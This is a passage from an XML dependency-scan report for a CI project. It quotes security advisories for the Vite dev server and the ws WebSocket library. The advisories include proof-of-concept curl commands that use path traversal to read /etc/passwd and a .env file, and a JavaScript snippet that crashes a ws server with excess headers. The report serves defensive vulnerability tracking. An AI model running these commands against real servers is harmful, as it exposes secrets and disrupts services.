The contents of arbitrary files can be returned to the browser if the dev server is running on Node or Bun.

### Impact
Only apps with the following conditions are affected.

- explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))
- running the Vite dev server on runtimes that are not Deno (e.g. Node, Bun)

### Details

[HTTP 1.1 spec (RFC 9112) does not allow `#` in `request-target`](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2). Although an attacker can send such a request. For those requests with an invalid `request-line` (it includes `request-target`), the spec [recommends to reject them with 400 or 301](https://datatracker.ietf.org/doc/html/rfc9112#section-3.2-4). The same can be said for HTTP 2 ([ref1](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-2.4.1), [ref2](https://datatracker.ietf.org/doc/html/rfc9113#section-8.3.1-3), [ref3](https://datatracker.ietf.org/doc/html/rfc9113#section-8.1.1-3)).

On Node and Bun, those requests are not rejected internally and is passed to the user land. For those requests, the value of [`http.IncomingMessage.url`](https://nodejs.org/docs/latest-v22.x/api/http.html#messageurl) contains `#`. Vite assumed `req.url` won&apos;t contain `#` when checking `server.fs.deny`, allowing those kinds of requests to bypass the check.

On Deno, those requests are not rejected internally and is passed to the user land as well. But for those requests, the value of `http.IncomingMessage.url` did not contain `#`. 

### PoC
```
npm create vite@latest
cd vite-project/
npm install
npm run dev
```
send request to read `/etc/passwd`
```
curl --request-target /@fs/Users/doggy/Desktop/vite-project/#/../../../../../etc/passwd http://127.0.0.1:5173
```</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/175a83909f02d3b554452a7bd02b9f340cdfef70</url><name>https://github.com/vitejs/vite/commit/175a83909f02d3b554452a7bd02b9f340cdfef70</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-356w-63v5-8wf4</url><name>https://github.com/advisories/GHSA-356w-63v5-8wf4</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-32395</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-32395</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&lt;4.5.13:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-859w-5945-r5v3</name><severity unscored="true">moderate</severity><cwes><cwe>CWE-22</cwe></cwes><description>### Summary
The contents of files in [the project `root`](https://vite.dev/config/shared-options.html#root) that are denied by a file matching pattern can be returned to the browser.

### Impact

Only apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.
Only files that are under [project `root`](https://vite.dev/config/shared-options.html#root) and are denied by a file matching pattern can be bypassed.

- Examples of file matching patterns: `.env`, `.env.*`, `*.{crt,pem}`, `**/.env`
- Examples of other patterns: `**/.git/**`, `.git/**`, `.git/**/*`

### Details
[`server.fs.deny`](https://vite.dev/config/server-options.html#server-fs-deny) can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns).
These patterns were able to bypass for files under `root` by using a combination of slash and dot (`/.`).

### PoC
```
npm create vite@latest
cd vite-project/
cat &quot;secret&quot; &gt; .env
npm install
npm run dev
curl --request-target /.env/. http://localhost:5173
```

![image](https://github.com/user-attachments/assets/822f4416-aa42-461f-8c95-a88d155e674b)
![image](https://github.com/user-attachments/assets/42902144-863a-4afb-ac5b-fc16effa37cc)</description><references><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2025-46565</url><name>https://nvd.nist.gov/vuln/detail/CVE-2025-46565</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-859w-5945-r5v3</url><name>https://github.com/advisories/GHSA-859w-5945-r5v3</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/c22c43de612eebb6c182dd67850c24e4fab8cacb</url><name>https://github.com/vitejs/vite/commit/c22c43de612eebb6c182dd67850c24e4fab8cacb</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-859w-5945-r5v3</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-859w-5945-r5v3</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&lt;\=4.5.13:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="true"><fileName>ws:8.15.1</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?ws</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>ws</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>ws</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>8.15.1</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/ws@8.15.1</id><url>https://ossindex.sonatype.org/component/pkg:npm/ws@8.15.1?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-37890</name><severity>HIGH</severity><cvssV2><score>8.699999809265137</score><accessVector>NETWORK</accessVector><accessComplexity>LOW</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>HIGH</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-476</cwe></cwes><description>ws is an open source WebSocket client and server for Node.js. A request with a number of headers exceeding theserver.maxHeadersCount threshold could be used to crash a ws server. The vulnerability was fixed in ws@8.17.1 (e55e510) and backported to ws@7.5.10 (22c2876), ws@6.2.3 (eeb76d3), and ws@5.2.4 (4abd8f6). In vulnerable versions of ws, the issue can be mitigated in the following ways: 1. Reduce the maximum allowed length of the request headers using the --max-http-header-size=size and/or the maxHeaderSize options so that no more headers than the server.maxHeadersCount limit can be sent. 2. Set server.maxHeadersCount to 0 so that no limit is applied.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-37890?component-type=npm&amp;component-name=ws&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-37890] CWE-476: NULL Pointer Dereference</name></reference><reference><source>OSSIndex</source><url>https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</url><name>https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-37890</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-37890</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:ws:8.15.1:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-3h5v-q93c-6h6q</name><severity unscored="true">high</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-476</cwe></cwes><description>### Impact

A request with a number of headers exceeding the[`server.maxHeadersCount`][] threshold could be used to crash a ws server.

### Proof of concept

```js
const http = require(&apos;http&apos;);
const WebSocket = require(&apos;ws&apos;);

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = &quot;!#$%&amp;&apos;*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~&quot;.split(&apos;&apos;);
  const headers = {};
  let count = 0;

  for (let i = 0; i &lt; chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j &lt; chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = &apos;x&apos;;

      if (++count === 2000) break;
    }
  }

  headers.Connection = &apos;Upgrade&apos;;
  headers.Upgrade = &apos;websocket&apos;;
  headers[&apos;Sec-WebSocket-Key&apos;] = &apos;dGhlIHNhbXBsZSBub25jZQ==&apos;;
  headers[&apos;Sec-WebSocket-Version&apos;] = &apos;13&apos;;

  const request = http.request({
    headers: headers,
    host: &apos;127.0.0.1&apos;,
    port: wss.address().port
  });

  request.end();
});
```

### Patches

The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e)

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Credits

The vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.

### References

- https://github.com/websockets/ws/issues/2230
- https://github.com/websockets/ws/pull/2231

[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize
[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener
[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount
</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/issues/2230</url><name>https://github.com/websockets/ws/issues/2230</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</url><name>https://github.com/advisories/GHSA-3h5v-q93c-6h6q</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</url><name>https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</url><name>https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/pull/2231</url><name>https://github.com/websockets/ws/pull/2231</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</url><name>https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</url><name>https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</url><name>https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:ws:\&gt;\=8.0.0\&lt;8.17.1:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency></dependencies></analysis>